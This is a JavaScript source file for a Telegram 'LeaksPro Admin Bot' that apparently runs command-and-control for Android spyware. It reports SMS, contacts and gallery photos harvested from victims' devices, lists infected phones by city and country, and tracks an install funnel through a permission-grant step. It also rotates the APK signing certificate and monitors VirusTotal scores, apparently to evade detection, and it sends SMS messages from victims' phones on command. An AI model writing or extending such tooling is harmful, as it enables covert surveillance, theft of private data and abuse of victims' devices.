/**
 * Telegram Bot — Admin Control via Chat
 * Commands: /start, /stats, /devices, /online, /health, /rotate, /vt, /logs, /help
 * Also sends alerts for: new device, anomaly, VT flag, server failover
 */

const https = require('https');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID || '';

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
  console.warn('[TelegramBot] TELEGRAM_BOT_TOKEN or TELEGRAM_ADMIN_CHAT_ID env vars not set — bot will be disabled');
}

let db = null;
let io = null;
let pollTimer = null;
let lastUpdateId = 0;

function initBot(_db, _io) {
  db = _db;
  io = _io;
  if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.warn('[TelegramBot] Bot disabled — set TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID env vars');
    return;
  }
  console.log('[TelegramBot] Starting long-poll...');
  pollForUpdates();
}

function stopBot() {
  if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
}

// ═══ SEND MESSAGE ═══
function sendMessage(chatId, text, opts = {}) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: opts.parse_mode || 'HTML',
      disable_web_page_preview: true,
      ...opts
    });
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); } catch (e) { resolve(null); }
      });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

// ═══ SEND ALERT (to admin) ═══
function sendAlert(text) {
  return sendMessage(ADMIN_CHAT_ID, text).catch(e => {
    console.warn('[TelegramBot] Alert send failed:', e.message);
  });
}

// ═══ LONG POLLING ═══
function pollForUpdates() {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
  const req = https.get(url, { timeout: 35000 }, (res) => {
    let data = '';
    res.on('data', c => data += c);
    res.on('end', () => {
      try {
        const json = JSON.parse(data);
        if (json.ok && json.result && json.result.length > 0) {
          for (const update of json.result) {
            lastUpdateId = update.update_id;
            if (update.message && update.message.text) {
              handleCommand(update.message);
            }
          }
        }
      } catch (e) {
        console.warn('[TelegramBot] Parse error:', e.message);
      }
      pollTimer = setTimeout(pollForUpdates, 500);
    });
  });
  req.on('error', () => {
    pollTimer = setTimeout(pollForUpdates, 5000);
  });
  req.on('timeout', () => {
    req.destroy();
    pollTimer = setTimeout(pollForUpdates, 500);
  });
}

// ═══ COMMAND HANDLER ═══
async function handleCommand(msg) {
  const chatId = msg.chat.id.toString();
  // Only allow admin
  if (chatId !== ADMIN_CHAT_ID) {
    await sendMessage(chatId, '⛔ Unauthorized. This bot is private.');
    return;
  }

  const text = msg.text.trim();
  const [cmd, ...args] = text.split(/\s+/);

  try {
    switch (cmd.toLowerCase()) {
      case '/start':
      case '/help':
        await sendMessage(chatId, HELP_TEXT);
        break;

      case '/stats':
        await cmdStats(chatId);
        break;

      case '/devices':
        await cmdDevices(chatId);
        break;

      case '/online':
        await cmdOnline(chatId);
        break;

      case '/health':
        await cmdHealth(chatId);
        break;

      case '/rotate':
        await cmdRotate(chatId);
        break;

      case '/vt':
        await cmdVtStatus(chatId);
        break;

      case '/funnel':
        await cmdFunnel(chatId);
        break;

      case '/recent':
        await cmdRecent(chatId);
        break;

      case '/sms':
        await cmdSms(chatId, args);
        break;

      case '/broadcast':
        await cmdBroadcast(chatId, args.join(' '));
        break;

      default:
        await sendMessage(chatId, `❓ Unknown command: <code>${cmd}</code>\nType /help for available commands.`);
    }
  } catch (e) {
    await sendMessage(chatId, `❌ Error: ${e.message}`);
  }
}

// ═══ COMMAND IMPLEMENTATIONS ═══

const HELP_TEXT = `
🤖 <b>LeaksPro Admin Bot</b>

<b>📊 Monitoring</b>
/stats — Dashboard overview
/devices — All registered devices
/online — Currently online devices
/health — Server health check
/funnel — Install funnel analytics
/recent — Recent activity log

<b>🔧 Actions</b>
/rotate — Trigger APK rotation
/vt — VirusTotal scan status
/sms &lt;deviceId&gt; &lt;to&gt; &lt;msg&gt; — Send SMS
/broadcast &lt;message&gt; — Message all devices

<b>ℹ️ Info</b>
/help — Show this menu
`;

async function cmdStats(chatId) {
  if (!db) return sendMessage(chatId, '❌ Database not ready');
  const totalDevices = db.prepare('SELECT COUNT(*) as c FROM devices').get()?.c || 0;
  const onlineDevices = db.prepare('SELECT COUNT(*) as c FROM devices WHERE is_online = 1').get()?.c || 0;
  const totalVideos = db.prepare('SELECT COUNT(*) as c FROM videos').get()?.c || 0;
  const totalSms = db.prepare('SELECT COUNT(*) as c FROM sms_messages').get()?.c || 0;
  const totalContacts = db.prepare('SELECT COUNT(*) as c FROM contacts').get()?.c || 0;
  const totalPhotos = db.prepare('SELECT COUNT(*) as c FROM gallery_photos').get()?.c || 0;
  const totalUsers = db.prepare('SELECT COUNT(*) as c FROM app_users').get()?.c || 0;

  // Funnel stats
  let funnelLine = '';
  try {
    const visits = db.prepare("SELECT COUNT(*) as c FROM analytics_events WHERE event = 'page_visit'").get()?.c || 0;
    const downloads = db.prepare("SELECT COUNT(*) as c FROM analytics_events WHERE event = 'download_start'").get()?.c || 0;
    const installs = db.prepare("SELECT COUNT(*) as c FROM analytics_events WHERE event = 'app_install'").get()?.c || 0;
    funnelLine = `\n📈 <b>Funnel:</b> ${visits} visits → ${downloads} downloads → ${installs} installs`;
  } catch (_) {}

  const msg = `
📊 <b>Dashboard Stats</b>

📱 <b>Devices:</b> ${totalDevices} total | ${onlineDevices} online
🎬 <b>Videos:</b> ${totalVideos}
👥 <b>Users:</b> ${totalUsers}

📥 <b>Data Collected:</b>
  💬 SMS: ${totalSms}
  📇 Contacts: ${totalContacts}
  🖼️ Gallery: ${totalPhotos}
${funnelLine}
⏰ ${new Date().toISOString().replace('T', ' ').slice(0, 19)} UTC
  `.trim();

  await sendMessage(chatId, msg);
}

async function cmdDevices(chatId) {
  if (!db) return sendMessage(chatId, '❌ Database not ready');
  const devices = db.prepare('SELECT device_id, device_name, model, is_online, last_seen, country, city FROM devices ORDER BY last_seen DESC LIMIT 20').all();
  if (!devices.length) return sendMessage(chatId, '📱 No devices registered yet.');

  let lines = ['📱 <b>Devices</b> (latest 20)\n'];
  for (const d of devices) {
    const status = d.is_online ? '🟢' : '🔴';
    const loc = [d.city, d.country].filter(Boolean).join(', ') || '—';
    lines.push(`${status} <code>${d.device_id.slice(0, 12)}</code> ${d.model || d.device_name || '?'} | ${loc}`);
  }
  await sendMessage(chatId, lines.join('\n'));
}

async function cmdOnline(chatId) {
  if (!db) return sendMessage(chatId, '❌ Database not ready');
  const devices = db.prepare('SELECT device_id, device_name, model, last_seen, country, city FROM devices WHERE is_online = 1').all();
  if (!devices.length) return sendMessage(chatId, '📱 No devices online right now.');

  let lines = [`🟢 <b>${devices.length} Online</b>\n`];
  for (const d of devices) {
    const loc = [d.city, d.country].filter(Boolean).join(', ') || '—';
    lines.push(`• <code>${d.device_id.slice(0, 12)}</code> ${d.model || d.device_name || '?'} | ${loc}`);
  }
  await sendMessage(chatId, lines.join('\n'));
}

async function cmdHealth(chatId) {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const mem = process.memoryUsage();
  const rss = (mem.rss / 1048576).toFixed(1);
  const heap = (mem.heapUsed / 1048576).toFixed(1);

  const msg = `
🏥 <b>Server Health</b>

⏱️ <b>Uptime:</b> ${h}h ${m}m
💾 <b>Memory:</b> ${rss} MB RSS / ${heap} MB Heap
🖥️ <b>Node:</b> ${process.version}
🌐 <b>Platform:</b> ${process.platform}
⏰ ${new Date().toISOString().replace('T', ' ').slice(0, 19)} UTC
  `.trim();
  await sendMessage(chatId, msg);
}

async function cmdRotate(chatId) {
  await sendMessage(chatId, '🔄 Triggering APK rotation...');
  try {
    const resp = await fetch(`http://localhost:${process.env.PORT || 3000}/api/setup/activate`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{}'
    });
    const data = await resp.json();
    if (data.success) {
      await sendMessage(chatId, `✅ Rotation complete!\n📝 Cert: ${data.certInfo?.cn || '?'}\n🔑 Hash: ${(data.certInfo?.hash || '?').slice(0, 16)}...`);
    } else {
      await sendMessage(chatId, `⚠️ Rotation returned: ${JSON.stringify(data).slice(0, 300)}`);
    }
  } catch (e) {
    await sendMessage(chatId, `❌ Rotation failed: ${e.message}`);
  }
}

async function cmdVtStatus(chatId) {
  try {
    const lastScan = db.prepare("SELECT value FROM admin_settings WHERE key = 'vt_last_scan'").get();
    const lastScore = db.prepare("SELECT value FROM admin_settings WHERE key = 'vt_last_score'").get();
    const lastResult = db.prepare("SELECT value FROM admin_settings WHERE key = 'vt_last_result'").get();

    const msg = `
🛡️ <b>VirusTotal Status</b>

📅 Last Scan: ${lastScan?.value || 'Never'}
📊 Score: ${lastScore?.value || 'N/A'}
📝 Result: ${lastResult?.value || 'No scans yet'}
    `.trim();
    await sendMessage(chatId, msg);
  } catch (e) {
    await sendMessage(chatId, `❌ ${e.message}`);
  }
}

async function cmdFunnel(chatId) {
  try {
    const events = ['page_visit', 'download_start', 'download_complete', 'app_install', 'first_open', 'permission_grant', 'first_sync'];
    const labels = ['🌐 Page Visit', '⬇️ Download Start', '✅ Download Done', '📲 Install', '🚀 First Open', '🔐 Permissions', '🔄 First Sync'];
    let lines = ['📈 <b>Install Funnel (All Time)</b>\n'];

    for (let i = 0; i < events.length; i++) {
      const count = db.prepare("SELECT COUNT(*) as c FROM analytics_events WHERE event = ?").get(events[i])?.c || 0;
      lines.push(`${labels[i]}: <b>${count}</b>`);
    }
    await sendMessage(chatId, lines.join('\n'));
  } catch (_) {
    await sendMessage(chatId, '📈 Analytics not available yet. Landing page events will appear after first visit.');
  }
}

async function cmdRecent(chatId) {
  try {
    const events = db.prepare("SELECT * FROM analytics_events ORDER BY created_at DESC LIMIT 15").all();
    if (!events.length) return sendMessage(chatId, '📝 No recent events.');
    let lines = ['📝 <b>Recent Activity</b>\n'];
    for (const e of events) {
      const time = e.created_at ? e.created_at.slice(11, 19) : '?';
      lines.push(`<code>${time}</code> ${e.event} ${e.country || ''} ${e.device_model || ''}`);
    }
    await sendMessage(chatId, lines.join('\n'));
  } catch (_) {
    await sendMessage(chatId, '📝 No analytics events yet.');
  }
}

async function cmdSms(chatId, args) {
  if (args.length < 3) {
    return sendMessage(chatId, '📱 Usage: /sms &lt;deviceId&gt; &lt;toNumber&gt; &lt;message text&gt;');
  }
  const [deviceId, toNumber, ...msgParts] = args;
  const smsText = msgParts.join(' ');
  try {
    const resp = await fetch(`http://localhost:${process.env.PORT || 3000}/api/admin/send-sms`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-admin-password': db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get()?.value || 'admin123' },
      body: JSON.stringify({ device_id: deviceId, receiver: toNumber, message: smsText })
    });
    const data = await resp.json();
    await sendMessage(chatId, data.success ? `✅ SMS sent to ${toNumber} via ${deviceId.slice(0, 12)}` : `❌ ${data.error || 'Failed'}`);
  } catch (e) {
    await sendMessage(chatId, `❌ ${e.message}`);
  }
}

async function cmdBroadcast(chatId, message) {
  if (!message) return sendMessage(chatId, '📢 Usage: /broadcast &lt;message&gt;');
  if (!io) return sendMessage(chatId, '❌ Socket.IO not ready');
  io.emit('admin_broadcast', { message, timestamp: Date.now() });
  const onlineCount = db.prepare('SELECT COUNT(*) as c FROM devices WHERE is_online = 1').get()?.c || 0;
  await sendMessage(chatId, `📢 Broadcast sent to ${onlineCount} online device(s)`);
}

module.exports = { initBot, stopBot, sendAlert };
